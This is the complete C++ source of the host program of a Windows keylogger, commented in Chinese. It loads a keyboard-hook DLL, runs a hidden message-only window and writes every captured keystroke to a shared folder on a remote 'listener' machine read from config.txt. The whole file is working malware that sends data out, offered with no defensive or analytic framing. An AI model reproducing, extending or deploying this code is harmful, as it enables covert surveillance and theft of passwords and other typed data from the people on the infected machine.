#include <windows.h> // 包含 Windows API
#include <fstream>   // 用于文件流操作
#include <string>    // 用于 std::wstring
#include <iostream>  // 用于 std::getline (虽然这里用的是宽字符流，但getline定义在这里)
// #include <vector> // 未使用，可以移除
// #include <stdio.h> // 未使用 printf，可以移除

// 声明DLL函数
typedef void (*SET_HOOK)(HWND);
typedef void (*RELEASE_HOOK)();

// 全局变量
HMODULE hDll = NULL;
SET_HOOK SetHook = NULL;
RELEASE_HOOK ReleaseHook = NULL;
std::ofstream logFile; // 使用 std::ofstream 写入文件

// 窗口过程函数
// 接收来自钩子DLL的消息
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_USER + 100:  // 自定义消息，接收按键信息
    {
        // wParam 携带按键信息的 char* 指针
        char* pKey = (char*)wParam;
        if (logFile.is_open() && pKey != nullptr) // 确保文件已打开且指针有效
        {
            logFile << pKey << std::endl;
            logFile.flush(); // 立即将缓冲区内容写入文件，避免数据丢失
        }
        // 移除 printf，Windows 应用通常不输出到控制台
        // printf("Key pressed: %s\n", pKey);
    }
    break;

    case WM_DESTROY:
        // 窗口销毁时释放钩子和DLL资源
        if (ReleaseHook)
            ReleaseHook();

        if (hDll)
        {
            FreeLibrary(hDll);
            hDll = NULL;
        }

        if (logFile.is_open()) // 确保文件已打开再关闭
        {
            logFile.close();
        }
        PostQuitMessage(0); // 发送退出消息，结束消息循环
        break;

    default:
        // 处理其他未处理的消息
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Windows 应用程序入口点
// hInstance: 应用程序的实例句柄
// hPrevInstance: 总是 NULL
// lpCmdLine: 命令行参数字符串 (宽字符)
// nCmdShow: 窗口的显示状态 (对于隐藏窗口不重要)
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance); // 标记参数未使用，避免编译器警告
    UNREFERENCED_PARAMETER(lpCmdLine);     // 标记参数未使用
    UNREFERENCED_PARAMETER(nCmdShow);      // 标记参数未使用

    std::wstring listenerAddress;
    // 尝试打开名为 config.txt 的配置文件，使用宽字符流
    std::wifstream configFile(L"config.txt");

    if (configFile.is_open())
    {
        // 从文件中读取第一行作为监听方地址
        std::getline(configFile, listenerAddress);
        configFile.close();

        // 移除读取到的地址字符串两端的空白字符 (空格、制表符、换行符等)
        size_t first = listenerAddress.find_first_not_of(L" \t\n\r");
        if (std::wstring::npos != first)
        {
            size_t last = listenerAddress.find_last_not_of(L" \t\n\r");
            listenerAddress = listenerAddress.substr(first, (last - first + 1));
        }
        else
        {
            // 文件是空的或者只有空白字符
            MessageBox(NULL, L"Config file is empty or contains only whitespace!", L"Error", MB_OK);
            return 1; // 错误退出
        }

        if (listenerAddress.empty())
        {
            // 读取到的地址为空字符串
            MessageBox(NULL, L"Listener address not found in config.txt!", L"Error", MB_OK);
            return 1; // 错误退出
        }

    }
    else
    {
        // 如果配置文件不存在或无法打开，弹出错误提示并退出
        MessageBox(NULL, L"Failed to open config.txt! Please place config.txt with listener address next to the executable.", L"Error", MB_OK);
        return 1; // 错误退出
    }

    // 构建完整的网络路径 (UNC 路径格式: \\\\主机名或IP\\共享名\\文件名)
    // 假设共享文件夹名称固定为 "KeyLogs"
    std::wstring logFilePath = L"\\\\";
    logFilePath += listenerAddress;
    logFilePath += L"\\KeyLogs\\keylogs.txt"; // 注意：KeyLogs 是您在监听方机器上设置的共享文件夹名称

    // 创建日志文件
    // std::ofstream 通常支持 UNC 路径，但确保权限和共享设置正确是关键
    logFile.open(logFilePath.c_str(), std::ios::app); // 使用 append 模式打开，以便追加写入
    if (!logFile.is_open())
    {
        // 文件打开失败，显示详细错误信息
        std::wstring errorMessage = L"Failed to open or create log file at: ";
        errorMessage += logFilePath;
        errorMessage += L"\nEnsure the shared folder exists, permissions are set correctly, and the listener machine is accessible.";
        MessageBox(NULL, errorMessage.c_str(), L"Error", MB_OK | MB_ICONERROR); // 添加错误图标提示
        return 1; // 错误退出
    }

    // 创建窗口类
    WNDCLASSEX wc = { sizeof(WNDCLASSEX) }; // 初始化结构体大小
    wc.lpfnWndProc = WndProc;              // 设置窗口过程函数
    wc.hInstance = hInstance;              // 使用 WinMain 接收到的实例句柄
    wc.lpszClassName = L"KeyLoggerMessageClass"; // 设置窗口类名称
    // 其他成员可以保持默认或根据需要设置，例如 hIcon, hCursor, hbrBackground 等

    // 注册窗口类
    if (!RegisterClassEx(&wc))
    {
        // 窗口类注册失败
        MessageBox(NULL, L"Window Class Registration Failed!", L"Error", MB_OK | MB_ICONERROR);
        if (logFile.is_open()) logFile.close(); // 注册失败也要关闭文件
        return 1; // 错误退出
    }

    // 创建隐藏的消息窗口 (使用 HWND_MESSAGE 作为父窗口)
    // 消息窗口不创建实际的可见界面，只用于接收消息
    HWND hWnd = CreateWindowEx(
        0,                           // 扩展窗口样式 (这里不需要)
        L"KeyLoggerMessageClass",    // 窗口类名称
        NULL,                        // 窗口标题 (消息窗口不需要标题)
        0,                           // 窗口样式 (0 表示不可见，对于消息窗口是默认行为)
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, // 位置和大小 (对于消息窗口不重要)
        HWND_MESSAGE,                // 父窗口句柄 (指定创建消息窗口)
        NULL,                        // 菜单句柄 (消息窗口没有菜单)
        hInstance,                   // 应用程序实例句柄
        NULL                         // 创建参数
    );

    if (!hWnd)
    {
        // 窗口创建失败
        MessageBox(NULL, L"Window Creation Failed!", L"Error", MB_OK | MB_ICONERROR);
        if (logFile.is_open()) logFile.close(); // 窗口创建失败也要关闭文件
        // 注销窗口类，避免资源泄露（可选，但在退出前做比较好）
        // UnregisterClass(wc.lpszClassName, wc.hInstance);
        return 1; // 错误退出
    }

    // 加载钩子DLL
    hDll = LoadLibrary(L"KeyHookDLL.dll");
    if (!hDll)
    {
        // DLL加载失败
        MessageBox(NULL, L"Failed to load KeyHookDLL.dll! Ensure it's in the same directory as the executable.", L"Error", MB_OK | MB_ICONERROR);
        DestroyWindow(hWnd); // 加载DLL失败，销毁已创建的窗口
        // UnregisterClass(wc.lpszClassName, wc.hInstance);
        if (logFile.is_open()) logFile.close();
        return 1; // 错误退出
    }

    // 获取DLL中的函数地址
    SetHook = (SET_HOOK)GetProcAddress(hDll, "SetHook");
    ReleaseHook = (RELEASE_HOOK)GetProcAddress(hDll, "ReleaseHook");

    if (!SetHook || !ReleaseHook)
    {
        // 获取函数地址失败
        MessageBox(NULL, L"Failed to get DLL functions (SetHook/ReleaseHook)! Ensure KeyHookDLL.dll is correct.", L"Error", MB_OK | MB_ICONERROR);
        FreeLibrary(hDll);   // 释放DLL
        hDll = NULL;
        DestroyWindow(hWnd);
        // UnregisterClass(wc.lpszClassName, wc.hInstance);
        if (logFile.is_open()) logFile.close();
        return 1; // 错误退出
    }

    // 设置键盘钩子，将按键消息发送到创建的消息窗口
    SetHook(hWnd);

    // 消息循环
    // GetMessage 会阻塞直到接收到消息
    // TranslateMessage 处理虚拟键消息
    // DispatchMessage 将消息发送到窗口过程函数 WndProc
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 程序退出前，WM_DESTROY 消息会被处理，资源会在 WndProc 中释放

    // 在程序完全退出前注销窗口类 (可选，系统退出时也会自动清理)
    // UnregisterClass(wc.lpszClassName, wc.hInstance);

    return (int)msg.wParam; // 返回退出码
}
